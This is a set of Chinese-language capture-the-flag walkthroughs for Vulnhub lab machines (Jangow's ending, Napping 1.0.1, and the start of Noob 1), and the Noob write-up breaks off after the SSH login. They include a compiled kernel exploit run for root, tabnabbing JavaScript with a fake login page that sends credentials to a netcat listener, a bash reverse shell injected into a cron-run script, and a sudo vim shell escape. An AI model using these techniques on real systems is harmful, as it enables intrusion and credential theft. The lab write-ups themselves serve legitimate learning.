1(www-data:/var/www/html/site) $ chmod +x exp1 2(www-data:/var/www/html/site) $ ls -al 3total 68 4drwxr-xr-x 6 www-data www-data 4096 Feb 3 12:48 . 5drwxr-xr-x 3 root root 4096 Oct 31 2021 .. 6drwxr-xr-x 3 www-data www-data 4096 Jun 3 2021 assets 7-rw-r--r-- 1 www-data www-data 35 Jun 10 2021 busque.php 8drwxr-xr-x 2 www-data www-data 4096 Jun 3 2021 css 9-rwxr-xr-x 1 www-data www-data 21616 Feb 3 12:48 exp1 10-rw-r--r-- 1 www-data www-data 10190 Jun 10 2021 index.html 11drwxr-xr-x 2 www-data www-data 4096 Jun 3 2021 js 12-rw-r--r-- 1 www-data www-data 30 Feb 3 10:49 shell.php 13drwxr-xr-x 2 www-data www-data 4096 Jun 10 2021 wordpress 14(www-data:/var/www/html/site) $ ./exp1 15./exp1: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exp1)最后报错，GLIBC_2.34没找到，这是由于我在最新的kali linux上编译了程序，但靶机是Ubuntu 16.04，它携带的GLIBC版本远低于2.34，无法满足程序运行的需求
解决思路：让靶机自己编译45010.c 因此拖拽45010.c文件到蚁剑里
1www-data@jangow01:/etc$ cd /var/www/html/site/ 2www-data@jangow01:/var/www/html/site$ gcc 45010.c -o exp1 3gcc 45010.c -o exp1 4www-data@jangow01:/var/www/html/site$ chmod +x exp1 5chmod +x exp1 6www-data@jangow01:/var/www/html/site$ ./exp1 7./exp1 8id 9uid=0(root) gid=0(root) groups=0(root),33(www-data)提权成功
八、总结#总体思路是先进行端口扫描，接着进行网页勘察，接着发现注入漏洞，注入一句话木马，利用蚁剑尝试反弹shell，根据内核版本查找提权的漏洞，接着将病毒源代码放入靶机编译执行，提权

title: Vulnhub Napping 1.0.1
content:
一、修改靶机#1.1 修改启动参数进入单用户模式#启动靶机，在第一个界面加载完成，迅速单击shift进入GRUB菜单，接着e进入编辑模式，将ro（只读）修改为rw（读写），并参数末尾修改为single init=/bin/bash（直接启动到Bash环境，跳过密码验证），按Ctrl + X启动
1.2 修改网卡配置#输入ip a查看当前网卡名称，vim /etc/network/interfaces，将其中的名字修改为ens33，但若发现不存在该文件，这种情况是因为netplan软件接管了网卡管理，进入/etc/netplan文件夹，再进入00-netplan.yaml类似的配置文件，进入用i修改网络接口名称，再按Esc键，输入:wq保存退出
二、信息搜集#2.1端口扫描#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -p- -A --min-rate 1000 192.168.203.132 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 02:01 EST 4Nmap scan report for 192.168.203.132 5Host is up (0.00038s latency). 6Not shown: 65533 closed tcp ports (reset) 7PORT STATE SERVICE VERSION 822/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 9| ssh-hostkey: 10| 3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA) 11| 256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA) 12|_ 256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519) 1380/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 14| http-cookie-flags: 15| /: 16| PHPSESSID: 17|_ httponly flag not set 18|_http-server-header: Apache/2.4.41 (Ubuntu) 19|_http-title: Login 20MAC Address: 00:0C:29:23:4A:EB (VMware) 21Device type: general purpose|router 22Running: Linux 4.X|5.X, MikroTik RouterOS 7.X 23OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 24OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) 25Network Distance: 1 hop 26Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 27 28TRACEROUTE 29HOP RTT ADDRESS 301 0.38 ms 192.168.203.132 31 32OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 33Nmap done: 1 IP address (1 host up) scanned in 24.24 seconds2.2HTTP扫描#2.3.1 gobuster#gobuster扫描无结果
1┌──(kali㉿kali)-[/usr/share/wordlists] 2└─$ gobuster dir -u http://192.168.203.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 3=============================================================== 4Gobuster v3.8 5by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) 6=============================================================== 7[+] Url: http://192.168.203.132 8[+] Method: GET 9[+] Threads: 10 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 11[+] Negative Status codes: 404 12[+] User Agent: gobuster/3.8 13[+] Timeout: 10s 14=============================================================== 15Starting gobuster in directory enumeration mode 16=============================================================== 17/server-status (Status: 403) [Size: 280] 18Progress: 220558 / 220558 (100.00%) 19=============================================================== 20Finished 21===============================================================2.3.2网页探索（完整代码与思路）#注册账户1，密码123456 获得信息：在一个博客推广界面，要求提交自定义链接🔗，链接将由网站的管理员审核 F12查看信息，输入https://baidu.com/并提交，发现生成一个指向百度的超链接且在其代码中发现a标签中只有target=_blank，而没有用rel="noopener/noreferrer"属性，当使用target="_blank"打开新页面时，新页面可以通过JavaScript的window.opener访问原页面的控制权
1<p> 2Thank you for your submission, you have entered: <a href="https://www.baidu.com" target="_blank">Here</a> 3</p>因此这里可能存在Tabnabbing漏洞（钓鱼攻击），可以制作恶意界面evil.html，让管理员账户登录到恶意界面，获取管理员账户信息
upfine.html代码如下：
1<!DOCTYPE html> 2<html> 3<body> 4 <script> 5 if(window.opener) window.opener.parent.location.replace('http://192.168.203.129:6688/get_info.html'); 6 if(window.opener != window) window.opener.parent.location.replace('http://192.168.203.129:6688/get_info.html'); 7 </script> 8</body> 9</html> window.opener指的是打开房前upfine.html页面的母页面 window.opener.parent.location.replace()作用是让母页面的URL强制跳转到攻击者指定的地址，http://192.168.174.131:6688/get_info.html，使用replace而非href是为了不留下浏览器后退历史，更隐蔽 不直接发get_info.html，如果直接发送钓鱼页面，管理员可能察觉到URL异常，通过upfine.html做一次跨窗口控制，可以更隐蔽篡改管理员已经打开的标签页，这种技术是Tabnabbing(标签页劫持) 退出到登录界面，检查源代码并复制，生成get_info.html，代码如下
1<!DOCTYPE html> 2<html lang="en"> 3<head> 4 <meta charset="UTF-8"> 5 <title>Login</title> 6 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"> 7 <style> 8 body{ font: 14px sans-serif; } 9 .wrapper{ width: 360px; padding: 20px; } 10 </style> 11</head> 12<body> 13 <div class="wrapper"> 14 <h2>Login</h2> 15 <p>Please fill in your credentials to login.</p> 16 <form action="index.php" method="post"> 17 <div class="form-group"> 18 <label>Username</label> 19 <input type="text" name="username" class="form-control " value=""> 20 <span class="invalid-feedback"></span> 21 </div> 22 <div class="form-group"> 23 <label>Password</label> 24 <input type="password" name="password" class="form-control "> 25 <span class="invalid-feedback"></span> 26 </div> 27 <div class="form-group"> 28 <input type="submit" class="btn btn-primary" value="Login"> 29 </div> 30 <p>Don't have an account? <a href="register.php">Sign up now</a>.</p> 31 </form> 32 </div> 33</body> 34</html>将两个文件放入一个文件夹内/home/kali/Desktop/vulnhub/napping-1.0.1/，接着python -m http.server 80，-m是module-name，http.server是python内置的标准库模块，运行后，当前文件夹中的所有文件都会通过网络暴露出来，
再开启对6688端口的监听nc -lvvp 6688，然后将http://192.168.174.131/upfine.html地址进行提交，监听窗口获得账户名和密码：
结果我提交后毫无反应，接着url直接输入http://192.168.174.131/get_info.html，并输入账户密码，看看get_info.html网页有没有问题，结果突然出现如下信息，但是，只成功一次，无法复刻！！：
1┌──(kali㉿kali)-[~] 2└─$ nc -lvvp 6688 3listening on [any] 6688 ... 4192.168.174.135: inverse host lookup failed: Unknown host 5connect to [192.168.174.131] from (UNKNOWN) [192.168.174.135] 37374 6POST /get_info.html HTTP/1.1 7Host: 192.168.174.131:6688 8User-Agent: python-requests/2.22.0 9Accept-Encoding: gzip, deflate 10Accept: */* 11Connection: keep-alive 12Content-Length: 45 13Content-Type: application/x-www-form-urlencoded 14 15username=daniel&password=C%40ughtm3napping123 sent 0, rcvd 279接着，再次提交http://192.168.174.131，触发index.html，按键后触发upfine.html，同样弹出信息
2.3.3 重做思路（简化代码）#文件1upfine.html攻击引导页
1<script> 2 if (window.opener) { 3 // 确保 IP 替换为你 Kali 现在的真实 IP 4 window.opener.location.replace('http://192.168.203.129:6688/get_info.html'); 5 } 6</script> window.opener，如果当前窗口是由另一个窗口打开的，window.opener返回那个窗口的引用；如果当前窗口不是由其他窗口打开的，则该属性返回null if (window.opener)，检查当前页面是否是由另一个页面通过链接（且带有target="_blank"属性）打开的 window.opener.location能获取并控制父窗口的URL .replace('钓鱼URL')将父窗口重定向到指定的钓鱼页面，这里不使用href，因为replace能从浏览器的历史记录中删除原页面，意味着受害者即使怀疑并点后退，也无法回到原本的合法页面 文件2get_info.html（钓鱼页面）
1<form action="http://192.168.203.129:6688/capture" method="post"> 2 <input type="text" name="username"> 3 <input type="password" name="password"> 4 <input type="submit" value="Login"> 5</form>部署与操作：
将2个文件放在kali的同一个目录下 在终端进入目录，启动python服务器，sudo python3 -m http.server 80 启动nc监听（接收密码），nc -lvvp 6688 在靶机表单提交http://192.168.203.129/upfine.html 观察nc命令窗口，约1分钟能看到数据 得到信息如下：
1┌──(kali㉿kali)-[~/vulnhub/vulnhub_napping_1.0.1] 2└─$ sudo python3 -m http.server 80 3Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 4192.168.203.1 - - [04/Mar/2026 20:30:10] "GET /upfine.html HTTP/1.1" 200 - 5192.168.203.1 - - [04/Mar/2026 20:30:10] code 404, message File not found 6192.168.203.1 - - [04/Mar/2026 20:30:10] "GET /favicon.ico HTTP/1.1" 404 - 7192.168.203.132 - - [04/Mar/2026 20:32:01] "GET /upfine.html HTTP/1.1" 200 - 8192.168.203.132 - - [04/Mar/2026 20:34:01] "GET /upfine.html HTTP/1.1" 200 - 9 10 11┌──(kali㉿kali)-[~] 12└─$ nc -lvvp 6688 13listening on [any] 6688 ... 14192.168.203.132: inverse host lookup failed: Host name lookup failure 15connect to [192.168.203.129] from (UNKNOWN) [192.168.203.132] 51902 16POST /get_info.html HTTP/1.1 17Host: 192.168.203.129:6688 18User-Agent: python-requests/2.22.0 19Accept-Encoding: gzip, deflate 20Accept: */* 21Connection: keep-alive 22Content-Length: 45 23Content-Type: application/x-www-form-urlencoded 24 25username=daniel&password=C%40ughtm3napping123 sent 0, rcvd 279 python http server日志分析：日志显示20:32:01和20:34:01分别有一次GET请求，说明靶机后台由一个Cron Job（定时任务），每隔两分钟就会运行一次机器人脚本来审核提交的链接，状态码200说明，靶机成功下载了upfine.html netcat日志分析，from[192.168.203.132]，确认是靶机主动把数据送到了kali，User-Agent说明了管理员是使用Pythonrequests库编写的自动化脚本，它被Tabnabbing脚本欺骗，跳转到了钓鱼页，并提交了表单 %40是URL编码，对应@，实际密码是C@ughtm3napping123 2.3.4 思路梳理#第一次思路
三个文件get_info.html、upfine.html、index.html
文件/命令 作用 sudo python3 -m http.server 80 将当前终端所在的目录立即变成一个可以通过网络访问的 HTTP 静态文件服务器，让靶机能通过网络请求下载运行我的三个文件，且能将文件夹映射为URL路径，例如，文件夹里有upfine.html，那么访问http://KALI_ip/upfine.html能触发其中的JavaScript脚本，而80则意味着靶机访问我的Kali时，URL只需要写http://192.168.174.129/，而不需要额外标注端口号 index.html(诱饵页) 是用户最初访问的合法页面，包含链接，诱导用户在新标签打开upfine.html upfine.html(攻击脚本) 当被打开后，会反过来控制它的父窗口（即index.html所在的标签页），强制让父窗口跳转到钓鱼页面 get_info.html(钓鱼页) 伪造登录界面，用户看完"惊喜内容"回到原标签页，会发现登陆已过期，从而不经意间输入账户密码 第二次思路
提交链接：在网站表单提交http://192.168.203.129/upfine.html 触发执行：靶机机器人（.132）每2分钟检查一次，打开了upfine.html 劫持窗口：upfine.html里的JS代码修改了机器人原窗口的地址，将其重定向到get_info.html（由Python服务器托管） 自动提交：机器人回到原窗口，以为需要重新登录，自动填充了daniel的账号密码并点击提交 捕获成功：nc拦截到了这个POST请求，将明文密码显示在命令行中 三、提权#ssh daniel@192.168.203.132，C@ughtm3napping123
3.1 基础信息搜集#1daniel@napping:~$ whoami 2daniel 3daniel@napping:~$ id 4uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators) 5daniel@napping:~$ uname -a 6Linux napping 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 7daniel@napping:~$ cat /etc/issue 8Ubuntu 20.04.3 LTS \n \l 9 10daniel@napping:~$ netstat -antp 11 12Command 'netstat' not found, but can be installed with: 13 14apt install net-tools 15Please ask your administrator.身份上，现在处于administrators(GID 1002)组，这不是标准组。 系统内核上，Linux 5.4.0-89-generic属于比较现代的内核，内核溢出不是首选
由于处于非标准组，应该查找系统中所有属于administators用户组的文件或目录
3.2 提权#1daniel@napping:~$ find / -group administrators 2>/dev/null 2/home/adrian/query.py 3daniel@napping:~$ cat /home/adrian/query.py 4from datetime import datetime 5import requests 6 7now = datetime.now() 8 9r = requests.get('http://127.0.0.1/') 10if r.status_code == 200: 11 f = open("site_status.txt","a") 12 dt_string = now.strftime("%d/%m/%Y %H:%M:%S") 13 f.write("Site is Up: ") 14 f.write(dt_string) 15 f.write("\n") 16 f.close() 17else: 18 f = open("site_status.txt","a") 19 dt_string = now.strftime("%d/%m/%Y %H:%M:%S") 20 f.write("Check Out Site: ") 21 f.write(dt_string) 22 f.write("\n") 23 f.close()同样属于administrators组的文件位于/home/adrian/query.py，它在另一个用户adrian的家目录下（我是daniel），此脚本定期使用requests访问本地web服务，并将结果写入site_status.txt
接着查看是否拥有对该脚本的写权限(w)
1daniel@napping:~$ ls -l /home/adrian/query.py 2-rw-rw-r-- 1 adrian administrators 481 Oct 30 2021 /home/adrian/query.py权限位-rw-rw-r--，所有者adrian(rw)，所属组administrators(rw)，其他用户(r)，而我作为administrators组的成员，拥有对此文件的直接修改权限
接着查看site_status.txt文件的所有者
1daniel@napping:/home/adrian$ ls -l /home/adrian/site_status.txt 2-rw-rw-r-- 1 adrian adrian 10240 Mar 5 06:42 /home/adrian/site_status.txt该文件的用户和组都是adrian，最后修改时间是Mar 5 06:42，这是一个以adrian身份运行的定时任务(Cron job)。
既然我的身份可以修改query.py，而adrian会定期执行它，那么我可以写入反弹shell脚本来让query.py脚本进行执行，获取更高的权限的shell
在/home/daniel下写入shell.sh文件
1#!/bin/bash 2bash -c 'bash -i >& /dev/tcp/192.168.203.129/6688 0>&1'在query.py文件添加对shell.sh脚本的执行，内容如下：
1import os 2os.system('/usr/bin/bash /home/daniel/shell.sh')kali中开启6688端口监听，成功拿到adrian用户的shell权限
1┌──(kali㉿kali)-[~] 2└─$ nc -lvvp 6688 3listening on [any] 6688 ... 4192.168.203.132: inverse host lookup failed: Host name lookup failure 5connect to [192.168.203.129] from (UNKNOWN) [192.168.203.132] 52796 6bash: cannot set terminal process group (4636): Inappropriate ioctl for device 7bash: no job control in this shell 8adrian@napping:~$ id 9id 10uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)3.3 进一步提权#进入adrian的shell里检查此用户是否有不用密码能运行root的权限命令
1adrian@napping:~$ sudo -l 2sudo -l 3Matching Defaults entries for adrian on napping: 4 env_reset, mail_badpass, 5 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 6 7User adrian may run the following commands on napping: 8 (root) NOPASSWD: /usr/bin/vim env_reset出于安全考虑，当运行sudo时，系统会重置大部分当前用户的环境变量，只保留极少数俺去那的变量，防止用户构造恶意的环境变量来劫持root进程 mail_badpass若有人尝试sudo但输错了密码，系统会给管理员发送通知邮件 secure_path是sudo执行命令时唯一信任的搜索路径，即使在自己的家目录写下一个名为vim的恶意脚本，如果执行sudo vim，系统也只会从指定的目录找真的vim 该用户能不需要密码使用root权限的vim 3.4vim提权#sudo vim -c ':!/bin/bash'
-c是vim的命令行参数，启动后立即执行后面的vim指令 :!，在vim内部，!用于调用外部shell命令（就像:wq能保存并退出一样） 执行过程：命令root身份的vim去执行/bin/bash，此时vim会分叉出子进程 python3 -c 'import pty;pty.spawn("/bin/bash")'升级一下shell，成功变为root
-c告诉python直接运行引号内的代码，而不是打开一个文件 import pty导入python的伪终端模块 pty.spawn("/bin/bash")，spawn意味着孵化，会启动一个新的/bin/bash进程，并将其标准输入/输出连接到一个伪终端(PTY)上 最后cd /root收获flag，
1root@napping:~# cat root.txt 2cat root.txt 3Admins just can't stay awake tsk tsk tsk管理员就是没法保持清醒，啧啧啧

title: Vulnhub Noob 1
content:
一、信息收集#1.1 使用nmap对目标靶机扫描#1zsh: corrupt history file /home/kali/.zsh_history 2┌──(kali㉿kali)-[~] 3└─$ nmap -A -p 1-65535 192.168.242.43 4Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 20:14 EST 5Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan 6SYN Stealth Scan Timing: About 1.22% done; ETC: 17:29 (20:59:18 remaining)-A综合扫描，开启后同时启用以下功能： 1.操作系统探测-O（如windows10、ubuntu20.04、centos7）； 2.服务版本探测-sV（如80端口是Apache、22端口是OpenSSH）; 3.脚本扫描-sC，使用Nmap默认的探测脚本（NSE）检查常见漏洞或详细信息 4.路由追踪--traceroute追踪本机到目标主机的路由路径 -p（port），1-65535覆盖所有TCP端口 但是几乎21h的等待时间太久，而攻略博主中的时间只有18s，这是由于博主的目标主机对关闭的端口返回了RST数据包，Nmap收到后立即跳过，无需等待，而我都情况是，目标主机开启了防火墙或处于丢弃包模式(Drop)，导致端口状态显示为Filtered，Nmap必须等待每个端口超时才能确定状态。
接下来为修正方案带命令： 第一步，快速发现开放端口
1nmap -sS -p 1-65535 --min-rate 5000 192.168.242.43 -oN ports.txt结果如下：
1PORT STATE SERVICE 221/tcp open ftp 380/tcp open http 465534/tcp open unknown第二步，针对性扫描服务详情
1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -A -p 21,80,65534 192.168.242.43 3[sudo] password for kali: 4Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 20:41 EST 5Nmap scan report for 192.168.242.43 6Host is up (0.00072s latency). 7 8PORT STATE SERVICE VERSION 921/tcp open ftp vsftpd 3.0.3 10|_ftp-bounce: bounce working! 11| ftp-syst: 12| STAT: 13| FTP server status: 14| Connected to ::ffff:192.168.188.6 15| Logged in as ftp 16| TYPE: ASCII 17| No session bandwidth limit 18| Session timeout in seconds is 300 19| Control connection is plain text 20| Data connections will be plain text 21| At session startup, client count was 3 22| vsFTPd 3.0.3 - secure, fast, stable 23|_End of status 24| ftp-anon: Anonymous FTP login allowed (FTP code 230) 25| -rw-r--r-- 1 0 0 21 Sep 21 2021 cred.txt 26|_-rw-r--r-- 1 0 0 86 Jun 11 2021 welcome 2780/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 28|_http-title: Login 29|_http-server-header: Apache/2.4.29 (Ubuntu) 3065534/tcp open unknown 31| fingerprint-strings: 32| DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 33|_ Auth decrypt failed 34Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 1.端口21(FTP)： | ftp-anon: Anonymous FTP login allowed (FTP code 230)允许匿名登陆，任何人无需密码可进入FTP服务器 | -rw-r--r-- 1 0 0 21 Sep 21 2021 cred.txt目录下存在名为cred.txt的文件，cred是Credentials凭据的缩写，大概率有账户密码 2.端口80(HTTP): |_http-title: Login该网页是一个登录页面，结合FTP发现的cred.txt，这里通常是提交凭据、尝试获取系统权限的地方 3.端口65534(Unkown)： |_ Auth decrypt failed返回授权解密失败，说明端口运行着一个非标准服务，等待特定加密字符串或认证密钥 4.扫描警告： Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port，Nmap无法找到关闭的端口，导致系统版本识别不准确，说明目标主机有防火墙屏蔽了大部分端口（第一次命令响应慢的原因） 1.2 ftp端口#ftp://192.168.242.43输入后无响应，是由于现代浏览器已停止支持ftp://协议，因此使用终端FTP客户端，ftp连接到目标靶机，Name中输入anonymous，Password直接回车，ftp>中输入ls，get将cred.txt和welcome下载下来，接着exit退出
1┌──(kali㉿kali)-[~] 2└─$ sudo ftp 192.168.242.43 3[sudo] password for kali: 4Connected to 192.168.242.43. 5220 (vsFTPd 3.0.3) 6Name (192.168.242.43:kali): anonymous 7331 Please specify the password. 8Password: 9230 Login successful. 10Remote system type is UNIX. 11Using binary mode to transfer files. 12ftp> ls 13229 Entering Extended Passive Mode (|||36513|) 14150 Here comes the directory listing. 15-rw-r--r-- 1 0 0 21 Sep 21 2021 cred.txt 16-rw-r--r-- 1 0 0 86 Jun 11 2021 welcome 17226 Directory send OK. 18ftp> get cred.txt 19local: cred.txt remote: cred.txt 20229 Entering Extended Passive Mode (|||63973|) 21150 Opening BINARY mode data connection for cred.txt (21 bytes). 22100% |***************************************************************************************************************| 21 1.74 KiB/s 00:00 ETA 23226 Transfer complete. 2421 bytes received in 00:00 (1.04 KiB/s) 25ftp> get welcome 26local: welcome remote: welcome 27229 Entering Extended Passive Mode (|||11859|) 28150 Opening BINARY mode data connection for welcome (86 bytes). 29100% |***************************************************************************************************************| 86 34.53 KiB/s 00:00 ETA 30226 Transfer complete. 3186 bytes received in 00:00 (16.18 KiB/s) 32ftp> exit 33221 Goodbye.查看cred.txt，获得Y2hhbXA6cGFzc3dvcmQ=，接着进行base64命令解码：
1┌──(kali㉿kali)-[~] 2└─$ echo "Y2hhbXA6cGFzc3dvcmQ" | base64 -d 3champ:password 得到用户名champ，密码password
1.3 80端口#回到靶机ip界面登录80端口，单击about us会下载一个文件
二、信息分析#2.1文件整理#1┌──(kali㉿kali)-[~] 2└─$ cd ~/z_downloads 3 4┌──(kali㉿kali)-[~/z_downloads] 5└─$ ls 6funny.bmp funny.jpg sudo2.2图片检查#2.2.1 binwalk工具#用binwalk查看图片
1┌──(kali㉿kali)-[~/z_downloads] 2└─$ binwalk funny.bmp 3 4DECIMAL HEXADECIMAL DESCRIPTION 5-------------------------------------------------------------------------------- 60 0x0 JPEG image data, JFIF standard 1.01 7 8┌──(kali㉿kali)-[~/z_downloads] 9└─$ binwalk funny.jpg 10 11DECIMAL HEXADECIMAL DESCRIPTION 12-------------------------------------------------------------------------------- 130 0x0 JPEG image data, JFIF standard 1.01没有发现什么
2.2.2 dirb工具#再扫描网站目录，dirb是用于web目录扫描的工具，通过内置的字典尝试在目标网站后面拼接常见路径（如/admin、/config、/uploads）
1┌──(kali㉿kali)-[~/z_downloads] 2└─$ dirb http://192.168.242.43 3 4----------------- 5DIRB v2.22 6By The Dark Raver 7----------------- 8 9START_TIME: Tue Jan 20 21:40:20 2026 10URL_BASE: http://192.168.242.43/ 11WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt 12 13----------------- 14 15GENERATED WORDS: 4612 16 17---- Scanning URL: http://192.168.242.43/ ---- 18+ http://192.168.242.43/index.html (CODE:200|SIZE:5825) 19+ http://192.168.242.43/index.php (CODE:302|SIZE:0) 20+ http://192.168.242.43/server-status (CODE:403|SIZE:279) 21 22----------------- 23END_TIME: Tue Jan 20 21:40:29 2026 24DOWNLOADED: 4612 - FOUND: 32.2.3 dirsearch#安装dirsearchsudo apt update && sudo apt install dirsearch -y，其中apt是(advanced package tool)
1┌──(kali㉿kali)-[~] 2└─$ dirsearch -u http://192.168.242.43 3/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html 4 from pkg_resources import DistributionNotFound, VersionConflict 5 6 _|. _ _ _ _ _ _|_ v0.4.3 7 (_||| _) (/_(_|| (_| ) 8Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 9 10Output File: /home/kali/reports/http_192.168.242.43/_26-01-20_21-55-58.txt 11 12Target: http://192.168.242.43/ 13 14[21:55:58] Starting: 15[21:55:59] 403 - 279B - /.ht_wsr.txt 16[21:55:59] 403 - 279B - /.htaccess.bak1 17[21:55:59] 403 - 279B - /.htaccess.save 18[21:55:59] 403 - 279B - /.htaccess.sample 19[21:55:59] 403 - 279B - /.htaccess.orig 20[21:55:59] 403 - 279B - /.htaccess_extra 21[21:55:59] 403 - 279B - /.htaccess_sc 22[21:55:59] 403 - 279B - /.htaccess_orig 23[21:55:59] 403 - 279B - /.htaccessBAK 24[21:55:59] 403 - 279B - /.htaccessOLD 25[21:55:59] 403 - 279B - /.htaccessOLD2 26[21:55:59] 403 - 279B - /.html 27[21:55:59] 403 - 279B - /.htpasswds 28[21:55:59] 403 - 279B - /.htpasswd_test 29[21:55:59] 403 - 279B - /.httr-oauth 30[21:56:00] 403 - 279B - /.php 31[21:56:01] 403 - 279B - /.htm 32[21:56:11] 200 - 0B - /go.php 33[21:56:12] 302 - 0B - /index.php -> index.html 34[21:56:12] 302 - 0B - /index.php/login/ -> index.html 35[21:56:14] 302 - 0B - /logout.php -> index.html 36[21:56:19] 403 - 279B - /server-status/ 37[21:56:19] 403 - 279B - /server-status 38 39Task Completed无可疑发现
2.4 steghide工具#安装steghide工具，sudo apt install steghide -y 再使用steghide，先对jpg进行分析并提取hint.py文件，接着对bmp进行分析，密码为sudo，再提取bmp的文件user.txt
1┌──(kali㉿kali)-[~/z_downloads] 2└─$ steghide info funny.jpg 3"funny.jpg": 4 format: jpeg 5 capacity: 2.5 KB 6Try to get information about embedded data ? (y/n) y 7Enter passphrase: 8 embedded file "hint.py": 9 size: 93.0 Byte 10 encrypted: rijndael-128, cbc 11 compressed: yes 12 13┌──(kali㉿kali)-[~/z_downloads] 14└─$ steghide extract -sf funny.jpg 15Enter passphrase: 16wrote extracted data to "hint.py". 17 18┌──(kali㉿kali)-[~/z_downloads] 19└─$ ls 20funny.bmp funny.jpg hint.py sudo 21 22┌──(kali㉿kali)-[~/z_downloads] 23└─$ cat hint.py 24This is_not a python file but you are revolving around. 25well, try_ to rotate some words too. 26 27┌──(kali㉿kali)-[~/z_downloads] 28└─$ steghide info funny.bmp 29"funny.bmp": 30 format: jpeg 31 capacity: 2.5 KB 32Try to get information about embedded data ? (y/n) y 33Enter passphrase: 34 embedded file "user.txt": 35 size: 29.0 Byte 36 encrypted: rijndael-128, cbc 37 compressed: yes 38 39┌──(kali㉿kali)-[~/z_downloads] 40└─$ steghide extract -sf funny.bmp 41Enter passphrase: 42wrote extracted data to "user.txt".sudo文件内容为：Did you notice the file name? Isn’t is interesting? user.txt文件内容为：jgs:guvf bar vf n fvzcyr bar hint.py文件内容为：This is_not a python file but you are revolving around.well, try_ to rotate some words too.
根据hint文件提示，user中文件的字符串是rot加密，是rot13，解码后内容为：wtf:this one is a simple one
2.3 SSH登录#1┌──(kali㉿kali)-[~/z_downloads] 2└─$ ssh wtf@192.168.242.43 -p 55077 3The authenticity of host '[192.168.242.43]:55077 ([192.168.242.43]:55077)' can't be established. 4ED25519 key fingerprint is: SHA256:7llosBA8c0IhGD0Q/MfctQSSVRtzJrF8OOBmRA58IyE 5This key is not known by any other names. 6Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 7Warning: Permanently added '[192.168.242.43]:55077' (ED25519) to the list of known hosts. 8** WARNING: connection is not using a post-quantum key exchange algorithm. 9** This session may be vulnerable to "store now, decrypt later" attacks. 10** The server may need to be upgraded. See https://openssh.com/pq.html 11wtf@192.168.242.43's password: 12Permission denied, please try again. 13wtf@192.168.242.43's password: 14Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64) 15 16 * Documentation: https://help.ubuntu.com 17 * Management: https://landscape.canonical.com 18 * Support: https://ubuntu.com/advantage 19 20 System information as of Thu Jun 12 10:12:01 UTC 2025 21 22 System load: 0.13 Processes: 114 23 Usage of /: 49.9% of 8.79GB Users logged in: 0 24 Memory usage: 18% IP address for ens3: 192.168.242.43 25 Swap usage: 0% IP address for ens4: 10.0.2.15 26 27 * Super-optimized for small spaces - read how we shrank the memory 28 footprint of MicroK8s to make it the smallest full K8s around. 29 30 https://ubuntu.com/blog/microk8s-memory-optimisation 31 32 * Canonical Livepatch is available for installation. 33 - Reduce system reboots and improve kernel security. Activate at: 34 https://ubuntu.com/livepatch 35 3677 packages can be updated. 371 update is a security update. 38 39Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings 40 41 42Last login: Tue Sep 21 19:59:59 2021 from 192.168.169.1 43 _________________________________________ 44/ Best of all is never to have been born. \ 45\ Second best is to die soon. / 46 ----------------------------------------- 47 \ 48 \ 49 .--. 50 |o_o | 51 |:_/ | 52 // \ \ 53 (| | ) 54 /'\_ _/`\ 55 \___)=(___/接着找到第一个flag
